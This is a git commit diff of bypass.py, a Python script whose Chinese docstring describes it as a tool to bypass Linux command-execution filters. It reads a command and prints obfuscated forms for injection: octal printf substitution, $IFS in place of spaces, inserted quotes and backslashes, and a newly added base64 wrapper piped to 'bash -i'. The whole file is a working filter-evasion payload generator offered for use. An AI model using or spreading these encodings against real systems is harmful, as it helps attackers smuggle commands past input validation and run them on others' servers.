85d18cbee22019f67dcba19fe556ac4e9b6c6c32
truda8 <chenhaikun8@gmail.com>
2021-10-18 16:52:02 +0800

    edit

--- bypass.py
+++ bypass.py
@@ -3,8 +3,10 @@
 作者：Truda
 功能：Bypass Linux 命令执行
 '''
+import base64
+separate = "\n=============================="
 
-def bypass():
+def bypass(command):
     # printf 8 进制
     command_8 = []
     for c in command:
@@ -13,23 +15,42 @@ def bypass():
 
     encode_command1 = '$(printf "%s")' % "".join(command_8)
     encode_command2 = '$(printf$IFS"%s")' % "".join(command_8)
-    print(encode_command1, "\n")
-    print(encode_command2, "\n")
+    print(encode_command1, separate)
+    print(encode_command2, separate)
 
     # 加单引号
-    command_3 = [i for i in command]
-    for i in range(1, len(command_3) + 1, 2):
-        command_3[i] = "'%s'" % command_3[i]
-    encode_command_3 = "".join(command_3)
-    print(encode_command_3, "\n")
+    command_items = command.split(" ")
+    command_str = ""
+    for item in command_items:
+        command_item = [i for i in item]
+        for i in range(1, len(item), 2):
+            replace_str = "'%s'" % item[i]
+            command_item[i] = replace_str
+        command_str += " " + "".join(command_item)
+    print(command_str[1:], separate)
 
     # 替换空格
     space = "$IFS"
     command_remove_space = command.replace(" ", space)
-    print(command_remove_space, "\n")
+    print(command_remove_space, separate)
+
+    # 加转义字符
+    command_items = command.split(" ")
+    command_str = ""
+    for item in command_items:
+        command_item = [i for i in item]
+        for i in range(1, len(item), 2):
+            replace_str = "\\%s" % item[i]
+            command_item[i] = replace_str
+        command_str += " " + "".join(command_item)
+    print(command_str[1:], separate)
+
+    # base64 方法一
+    command_base64 = base64.b64encode(command.encode("UTF-8")).decode("utf-8")
+    command_str = "echo %s|base64 -d|bash -i" % command_base64
+    print(command_str, separate)
 
 
 if __name__ == "__main__":
-    # command = ""
-    command = input("🎃Command:")
-    bypass()
+    command = input("🎃 Command: ")
+    bypass(command)
